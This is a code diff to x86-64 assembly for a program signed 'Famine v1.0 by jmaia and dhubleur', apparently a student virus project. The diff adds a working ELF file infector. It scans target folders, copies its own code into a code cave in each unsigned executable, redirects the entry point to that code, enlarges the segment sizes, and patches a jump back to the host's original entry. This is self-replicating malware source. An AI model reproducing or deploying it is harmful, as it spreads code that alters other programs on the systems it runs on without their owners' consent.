@@ -83,14 +83,47 @@ endstruc
 section .text
 
 _start:
+	; save all registers
+	push rax
+	push rdi
+	push rsi
+	push rdx
+	push rcx
+	push rbx
+	push r8
+	push r9
+	push r10
+	push r11
+
 	mov rdi, infected_folder_1			; treate_folder(infected_folder_1);
 	call treate_folder				; ...
 	mov rdi, infected_folder_2			; treate_folder(infected_folder_2);
 	call treate_folder				; ...
 
+	; test if jmp_value is not defined
+	mov rax, [jmp_value]				; if (jmp_value != 0)
+	cmp rax, 0					; 	goto _jmp;
+	jne _jmp					; ...
+
+.end:
 	mov rax, SYS_EXIT				; exit(
 	mov rdi, 0					; 0
 	syscall						; );
+
+_jmp:
+	; restore all registers
+	pop r11
+	pop r10
+	pop r9
+	pop r8
+	pop rbx
+	pop rcx
+	pop rdx
+	pop rsi
+	pop rdi
+	pop rax
+_jmp_instr
+	jmp [jmp_value]					; jmp jmp_value => default behavior of infected file
 
 ; void treate_folder(char const *_folder);
 ; void treate_folder(rdi folder);
@@ -293,6 +326,12 @@ treat_file:
 	call has_signature				; ...
 	cmp rax, 1					; if (has_signature(mappedfile, exec_segment) == 1)
 	je .unmap_file					; 	goto .unmap_file
+
+	; TODO: check codecave can contain payload
+	; Inject payload
+	mov rdi, [mappedfile]				; inject(mappedfile, exec_segment);
+	mov rsi, [exec_segment]				; ...
+	call inject					; ...
 
 	; TODO: check codecave can contain signature
 	; Sign file
@@ -498,6 +537,82 @@ sign:
 	
 	.end:
 		ret
+; void inject(char const *file_map, elf64_phdr *exec_segment)
+; void inject(rdi file_map, rsi exec_segment);
+inject:
+	%push context
+	%stacksize flat64
+	%assign %$localsize 0
+
+	%local file_map:qword				; char const *file_map;
+	%local exec_segment:qword			; elf64_phdr *exec_segment;
+	%local old_entry:qword				; long old_entry;
+	%local new_entry:qword				; long new_entry;
+	%local computed_jmp_value:qword			; long computed_jmp_value;
+
+	; Initializes stack frame
+	push rbp
+	mov rbp, rsp
+	sub rsp, %$localsize
+
+	mov [file_map], rdi				; file_map = _file_map;
+	mov [exec_segment], rsi				; exec_segment = _exec_segment;
+
+	add rdi, elf64_hdr.e_entry			; old_entry = elf64_hdr.e_entry;
+	mov rax, [rdi]					; ...
+	mov [old_entry], rax				; ...
+
+	mov rdi, [exec_segment]				; new_entry = file_map + exec_segment->p_offset + exec_segment->p_filesz;
+	add rdi, elf64_phdr.p_offset			; ...
+	mov rax, [rdi]					; ...
+	mov rdi, [exec_segment]				; ...
+	add rdi, elf64_phdr.p_filesz			; ...
+	add rax, [rdi]					; ...
+	mov [new_entry], rax				; ...
+
+	mov rdi, [file_map]				; elf64_hdr.e_entry = new_entry
+	add rdi, elf64_hdr.e_entry			; ...
+	mov rsi, [new_entry]				; ...
+	mov [rdi], rsi					; ...
+
+	; copy all bytes between _start and _end to the codecave
+	mov rdi, [file_map]				; dest = file_map + new_entry;
+	add rdi, [new_entry]				; ...
+	mov rsi, _start					; src = _start;
+	mov rdx, _end - _start				; len = _end - _start;
+	rep movsb					; memcpy(dest, src, len);
+
+	; increment segment size
+	mov rdi, [exec_segment]				; exec_segment->p_memsz += _end - _start;
+	add rdi, elf64_phdr.p_memsz			; ...
+	add qword [rdi], _end - _start			; ...
+	mov rdi, [exec_segment]				; exec_segment->p_filesz += _end - _start;
+	add rdi, elf64_phdr.p_filesz			; ...
+	add qword [rdi], _end - _start			; ...
+
+	; compute jmp_value
+							; code_length_to_jmp = _jmp_instr - _start + 5 (5 is the size of the jmp instruction)
+	mov rdi, [old_entry]				; computed_jmp_value = old_entry - (new_entry + code_length_to_jmp);
+	sub rdi, [new_entry]				; ...
+	add rdi, _jmp_instr - _start			; ...
+	add rdi, 5					; ...
+	mov [computed_jmp_value], rdi			; ...
+
+	; change jmp_value in injected code
+	mov rdi, [file_map]				; jmp_value_ptr = file_map + new_entry + (_end - _start) - 8 (8 is the size of the jmp_value variable);
+	add rdi, [new_entry]				; ...
+	add rdi, _end - _start				; ...
+	sub rdi, 8					; ...
+	mov rsi, [computed_jmp_value]			; *jmp_value_ptr = computed_jmp_value;
+	mov [rdi], rsi					; ...
+
+	jmp .end					; goto end
+
+.end:
+	add rsp, %$localsize
+	pop rbp
+	%pop
+	ret
 
 ; DEBUG
 ; void print_string(char const *str);
@@ -540,3 +655,6 @@ section .data
 	len_elf_64_magic: equ $ - elf_64_magic
 	signature: db "Famine v1.0 by jmaia and dhubleur"
 	len_signature: equ $ - signature
+	jmp_value: dq 0x0000000000000000
+
+_end:
